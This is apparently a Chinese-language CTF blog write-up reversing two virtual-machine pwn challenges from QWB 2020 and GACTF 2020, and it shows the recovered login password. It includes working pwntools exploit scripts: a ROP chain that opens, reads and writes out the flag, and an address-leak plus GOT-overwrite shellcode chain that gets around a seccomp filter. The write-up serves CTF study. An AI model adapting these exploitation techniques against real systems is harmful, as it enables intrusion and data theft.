---
title: 'QWBlogin & GACTF vmpwn'
date: 2020-08-25 19:26:30
category: CTF
tags: [re,vm,pwn]
published: true
hideInList: false
feature: 
isTop: false
---



强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。



打完 `GACTF2020` 之后把其中的`vmpwn`也添加在此



## QWBlogin

该题给了一个 `emulator`虚拟机，运行的类似机器码的`test.bin`和`launch.sh`，之后`tips`的时候给了`Instruction.h`



### 逆向

#### main 函数

基本上程序运行依靠一个虚拟机的结构体，可以从`main`里面看到就是 `v9`结构体，后文会将介绍该结构体

```c
int main(int argc, char** argv)
{
    len = sub_ba0(argv[1]);
    if(len <= 0)
        exit(0);
    
    fd = open(argv[1], 0);
    if(fd < 0)
        exit(0);
    
    v8 = mmap(0, len, 1, 2, fd, 0);
    if(!v8)
        exit(0);
    
    // check image format
    if(memcmp(v8, "\x61\xde\x10\ef", 4))
        exit(2);
    
    // check lenth
    // segment?

    // v8[6, 14) ~ [14, 22) lenth
    if( *(int64_t*)(v8+6) > len || *(int64_t*)(v8+14) > len - *(int64_t*)(v8+6) )
        exit(3);
    
    // v8[22, 30) ~ [30, 38)
    if( *(int64_t*)(v8+22) > len || *(int64_t*)(v8+30) > len - *(int64_t*)(v8+22) )
        exit(4);

    // v[38, 46) > v8[14, 22)
    if( *(int64_t*)(v8+38) >= *(int64_t*)(v8+14) ) 
        exit(5);

    v9 = calloc(0xD0, 1);
    // v[6, 14) == offset v{14, 22) == segment_size
    // v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整
    v9[21] = calloc(1, v8[14, 22))
    memcpy(v9[21], &(v8[v8[6, 14)]),  v8[14, 22))
    v[20] = segment_size;

    // 
    v9[23] = calloc(1, v8[30, 38))
    memcpy(v9[23], &(v8[v8[22, 30)]), v8[30, 38))
    v9[22] = segment_size; 

    v9[25] = calloc(1, 0x20 000);
    v9[24] = 0x20 000;
    v9[18] = v8[38, 46)

    g_Var = calloc(0x18, 1);
    memset(g_Var, 0x18, 0);

    //链表结构 可能记录 segment flag 的
    // g_Var[0x10, 0x18) -> struct_18 -> struct_18;
    
          
    while(!sub_c1a(v9))
    {}
}
```

然后进入`c1a`结构体的时候，会发现`IDA`报出该函数太大无法分析，只能另外用`Ghidra`看能不能分析，然后发现能够反编译，于是对其进行`dump`反编译的文本进行分析



#### VM struct

其中关键的结构体被逆出来是如下

```c
struct VM
{
    int64_t r00;
    int64_t r01;
    int64_t r02;
    int64_t r03;
    int64_t r04;
    int64_t r05;
    int64_t r06;
    int64_t r07;
    int64_t r08;
    int64_t r09;
    int64_t r0a;
    int64_t r0b;
    int64_t r0c;
    int64_t r0d;
    int64_t r0e;
    int64_t r0f;
    int64_t r10;
    int64_t r11;
    int64_t pc;             // vm[0x12]
    int64_t flags;          // vm[0x13]
    int64_t text_size;      // vm[0x14]
    int64_t text_segment;   // vm[0x15]
    int64_t data_size;      // vm[0x16]
    int64_t data_segment;   // vm[0x17]
    int64_t io_file;        // 0x18 struct (int_no=0) -> 0x18 (int_no=1) -> 0x18 (int_no=2)
    int64_t stack;          // vm[0x19]
    // int64_t 
};
```

前面是寄存器，后面是一些段和存储的`io_file`链和虚拟的栈



#### op[1]

在`0xc1a`程序的开始先会判断当前`op`是否`<2`如果`<2`则退出，说明每一个指令至少都有两个字节，之后用了`op[1]&0xf`进行`switch case`判断当前指令长度

```c
switch op[1]&0xf
    case 0x00, 0x0b, 0xc, 0xd, 0xe, 
        4
    case 0x01, 0x02, 0x03, 0x04,
        0xb
    case 0x5:
        0x15: int8_t 4
        0x25: int16_t 5
        0x35: int32_t 7
        0x45: int64_t 0xb 
    case 0x6:
        3
    case 0x7:
        0x17: int8_t 3
        0x27: int16_t 4
        0x37: int32_t 6
        0x47: int64_t 10
    case 0x8:
        if op[0] == 0x20:
            2
        else:
            10
    case 0x9:
        if op[0] != 0x20 && a[0x14] - a[0x12] < 10
            return 1;
    case 0xa:
        2
    default:
        return 1;
```



#### 思考

在最开始的时候傻乎乎的顺着`dump`的函数逆，后来逆完`MOV`之后觉得其中`MUL/DIV/MOD`等一些内容都可以不用逆，然后我让一个学弟帮忙逆`XOR/OR/AND`等一些其他的，我去逆`JMP`这整个，后来觉得这个思路错了，其实如果`test.bin`的程序并没有自我修改的话，其实可以先根据`size`和`instrcution`把指令分了，再看是否需要逆一些指令，最后发现只有`mov pop push call ret jmp（中间少部分）syacall`需要很清楚的逆出来，其他的都可以不用逆。



#### 整理

最后需要的每个的情况都整理成如下模式

```python
# 20_syscall.c
switch op[0]:

// SYSCALL
// size == 2
case 0x20:
    r00 == 0
        op[1] == 0xa
        
        fd = open(data[r01], r02)
        insert fd into vm.io_file

    r00 == 1
        op[1]&0xf == 0x8:
            read(r01, data[r02], r03)

        op[1]&0xf == 0x9
            read(r01, stack[r02], r03)

    r00 == 2
        op[1]&0xf == 0x8:
            write(r01, data[r02], r03)
        
        op[1]&0xf == 0x9:
            write(r01, stack[r02], r03)

    r00 == 3
        close(r01)
```



#### 简易 emulator

最后根据整理的`op[0] op[1]`进行编写简易的分开`test.bin`的程序

```
ov r0, qword 0x45
call 0x45 0x1 0x53
mov r1, qword 0xa756f5920656553
push qword r1
mov r0, qword 0x2
mov r1, qword 0x1
mov qword r2, r16
mov r3, qword 0x8
syscall stack
hlt
mov r0, byte 0x2
mov r1, byte 0x1
mov r2, byte 0
mov r3, byte 0x23
syscall data
mov r0, byte 0x2
mov r1, byte 0x1
mov r2, byte 0x28
mov r3, byte 0xb
syscall data
mov r0, byte 0x1
mov r1, byte 0
mov r2, dword 0x40
mov r3, qword 0x1
syscall data
mov r8, byte ptr data[0x40]
cmp r8, byte 0x51				|Q
je 0x2
hlt
mov r0, byte 0x1
mov r1, byte 0
mov r2, byte 0x40
mov r3, byte 0x1
syscall data
mov r8, byte ptr data[0x40]
cmp r8, byte 0x57				| W
jne 0x3
jmp 0x2
hlt
mov qword ptr data[0x40], r9
mov r0, byte 0x1
mov r1, word 0
mov r2, word 0x40
mov r3, byte 0x1
syscall data
mov r8, byte ptr data[0x40]
xor r8, byte 0x77
cmp r8, byte 0x26				| Q
jne 0xffffffc9
mov qword ptr data[0x40], r9
mov qword ptr data[0x48], r9
mov qword ptr data[0x50], r9
mov qword ptr data[0x58], r9
mov qword ptr data[0x60], r9
mov r0, byte 0x1
mov r1, word 0
mov r2, word 0x40
mov r3, byte 0x21
syscall data					| read(0, data[0x40], 0x21)
xor qword r8, r8
mov r8, qword ptr data[0x40]	| G00DR3VR
mov r9, qword 0x427234129827abcd
xor qword r8, r9
cmp r8, qword 0x10240740dc179b8a
je 0x2
hlt
xor qword r8, r8
mov r8, qword ptr data[0x48]	| W31LD0N3
mov r9, qword 0x127412341241dead
xor qword r8, r9
cmp r8, qword 0x213a22705e70edfa
je 0x2
hlt
xor qword r8, r8
mov r8, qword ptr data[0x50]	| Try2Pwn!
mov r9, qword 0x8634965812abc123
xor qword r8, r9
cmp r8, qword 0xa75ae10820d2b377
je 0x2
hlt
xor qword r8, r8
mov r8, qword ptr data[0x58]	| GOGOGOGO
mov r9, qword 0x123216781236789a
xor qword r8, r9
cmp r8, qword 0x5d75593f5d7137dd
je 0x2
hlt
mov r0, byte 0x2
mov r1, byte 0x1
mov r2, byte 0x34
mov r3, byte 0x6
syscall data
push qword r17
mov qword r17, r16
sub r16, qword 0x100
mov qword r4, r16
mov r5, qword 0xa214f474f4721
push qword r5
mov r5, qword 0x574f4e54494e5750
push qword r5
mov qword r5, r16
mov r0, byte 0x2
mov r1, byte 0x1
mov qword r2, r16
mov r3, byte 0xf
syscall stack
mov r0, byte 0x1
mov r1, byte 0
mov qword r2, r4
mov r3, qword 0x800
syscall stack					| read(0, stack[], 0x800)
cmp r0, qword 0         
jnl 0x2
hlt
mov qword r3, r0
mov r1, byte 0x1
mov qword r2, r4
mov r0, qword 0x2
mov qword r16, r17      
pop qword r17
ret
```

于是程序就比较清晰了，如果输入了`password`为`QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO`就能走到最后溢出的地方

最后在`read(0, stack, 0x800)`的地方会出现溢出，然后在`ret`的时候把栈上的内容`pop`到`vm.pc`，于是就需要在`test.bin`里面找到可以用`gadgets`



### pwn

#### gadgets

在程序`RET`之后还有一大段无关的`opcode`，做到这步的时候才知道，这些就是为了凑`gadgets`的

其中标记为`R`的是不需要限制的

```python
# 0x0d 0xR6 0x00 0x11 0xRR
pop_r00_ret = 0x2f5         # 0x46
# 0x0d 0xR6 0x01 0X11 0xRR
pop_r01_ret = 0x377         # 0x46
# 0x0d 0xR6 0x02 0x11 0xRR
pop_r02_ret = 0x45c         # 0x46
# 0x0d 0xR6 0x03 0x11 0xRR
pop_r03_ret = 0x4e1         # 0x46

# 0x20 0x0a 0x11 0xRR
sys_open_ret = 0x6ed
# 0x20 0xR8 0x11 0xRR
sys_data_ret = 0x5b1
# 0x20 0xR9 0x11 0xRR
sys_stack_ret = 0x617
```



#### exp

由于`syscall`中只有`open | read | write | close`可用，很自然想到`orw`，然后构造`rop`链就行了，其中由于最开始打开了`test.bin`文件，所以`fd=4`，最初写`exp`的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了`struct.c => struct.o`再在调试的时候`add-symbol-file struct.o 0`即可



```python
payload = b"A"*0x108
# read(0, data[0x100], 0x20)
# r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20
payload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x20)
payload += p64(sys_data_ret)

# open(data[0x100], 0)
# r00 = 0 r01 = 0x200 r02 = 0
payload += p64(pop_r00_ret) + p64(0) + p64(pop_r01_ret) + p64(0x100) + p64(pop_r02_ret) + p64(0)
payload += p64(sys_open_ret)

# read(4, data[0x100], 0x30)
# r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30
payload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0x4) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)
payload += p64(sys_data_ret)

# write(1, data[0x100], 0x30)
# r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30
payload += p64(pop_r00_ret) + p64(2) + p64(pop_r01_ret) + p64(0x1) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)
payload += p64(sys_data_ret)
```



强的大佬，不需要`instruction.h`都能在5个小时内做出来，而我就是只菜鸡

[QWBlogin 题目](<https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin>)



## VMpwn

这个题目跟上一个题目一样先逆向，但是这个题目跟`QWBlogin`相比实现`vm`的时候简单一些

其中有一个 `chunk 0x30`用来记录寄存器的值`vm[0] vm[1] vm[2]` 类似`rdi, rsi, rdx`在`syscall`时会用到，`vm[3]`为`sp`，`vm[5]`为 `pc`

在最后的关键操作为对于`read(0, stack, 0x1000)`（栈只有`0x100`个字节）

```assembly
pwndbg> distance 0x555555759050 0x55555575ad68
0x555555759050->0x55555575ad68 is 0x1d18 bytes (0x3a3 words)

 RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0
 ► 0x5555555555db    call   rax <0x7ffff7b156c0>
        fd: 0x0
        buf: 0x55555575ad68 ◂— 0x0
        nbytes: 0x1000

pwndbg> telescope 0x555555758010
00:0000│   0x555555758010 ◂— 0x0
01:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x0
02:0010│   0x555555758020 ◂— 0x1000
03:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x0
04:0020│   0x555555758030 ◂— 0x0
05:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10
```

然后`puts(stack)`，可以看到该虚拟栈上有`heap`地址和`elf`地址，但是只能泄漏一个

```assembly
pwndbg> telescope 0x55555575ad68 0x30
00:0000│ rsi  0x55555575ad68 ◂— '1234454636\n'
01:0008│      0x55555575ad70 ◂— 0xa3633 /* '36\n' */
02:0010│      0x55555575ad78 ◂— 0x0
... ↓
1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f ('ok,what ')
1f:00f8│      0x55555575ae60 ◂— 0x0
20:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff
```

接下来同第一步的`read(0, stack, 0x1000)` `write(0, stack, 0x20)`然后`ret`



这个程序中有一个两个比较奇怪的地方，由于`ret`的时候程序的实现，是将`sp-=8`，但是`PUSH`为`sp-=8` `POP`为`sp+=8`，因此`ret`的时候比较奇怪，另外就是与`QWBlogin`相比没有 什么能用的`gadget`，因此想法只能为按照`vm`的规则，写`shellocde`，然后在最后`ret`的时候跳转过去，但是该题用 `seccomp`限制了只能 `orw`，且没有给`open`的 `syscall`只能泄漏

### 思路

因此思路就是，先利用`puts`泄漏`elf`的地址，然后再`ret`到最初`elf_code+0x3`然后再泄漏`heap`，`ret`到写入栈上的`shellcode`

利用`puts`泄漏`libc`，然后再次输入到栈上，利用`\x6d: mov reg[0], 0`作为`nop`，编写`shellcode`

然后将`open`写入`free`的位置，因此在调用`syscall 03`时就是调用`open`，最后利用`orw`进行读取`flag`

### exp

```python
# heap+0x2e68 => elf_bss

io.sendafter("name:", "A"*0xff+"#")

io.recvuntil("#")
elf.address = u64(io.recvn(6) + "\x00\x00") - 0x203851
success("elf", elf.address)


# 0xf8 + ret 
io.sendafter("say:", "A"*0x100 + p64(elf.address + 0x203023))

io.sendafter("name:", "\x50")
heap = u64(io.recvn(6) + "\x00\x00") - 0x50
success("heap", heap)

'''
mov reg[0], read_got
puts
mov reg[0], 0
mov reg[1], heap + addr
mov reg[2], 0x1000
read        
//  use 0x6d: mov reg[0], 0 as nop
'''

payload = "\x11" + p64(elf.got['read'])
payload += "\x8f\x02"
payload += "\x6d"
payload += "\x12" + p64(heap+0x2d60)
payload += "\x13" + p64(0x1000)
payload += "\x8f\x00"
payload = payload.ljust(0x100, "A")
payload += p64(heap+0x2d60)
io.sendafter("say:", payload)

io.recvuntil("bye~\n")

libc.address = u64(io.recvuntil("\n", drop=True).ljust(8, "\x00")) - libc.sym['read']

'''
flag
0x6d * 0x50
mov reg[1], elf.address+0x203900
mov reg[2], 8
read
mov reg[0], heap+0x2d60
mov reg[1], 0
open
mov reg[0], 3
mov reg[1], bss
mov reg[2], 0x30
read
mov reg[0], 1
mov reg[1], bss
mov reg[2], 0x30
write
'''

payload = "flag\x00"
payload = payload.ljust(0x50, "\x6d")
payload += "\x12" + p64(elf.address+0x2038f8)
payload += "\x13" + p64(8)
payload += "\x8f\x00"
payload += "\x11" + p64(heap+0x2d60)
payload += "\x6e"
payload += "\x8f\x03"
payload += "\x11" + p64(3)
payload += "\x12" + p64(elf.bss()+0x400)
payload += "\x13" + p64(0x30)
payload += "\x8f\x00"
payload += "\x11" + p64(1)
payload += "\x12" + p64(elf.bss()+0x400)
payload += "\x13" + p64(0x30)
payload += "\x8f\x01"

io.send(payload)

sleep(0.03)

io.send(p64(libc.sym['open']))

io.interactive()
io.close()

```

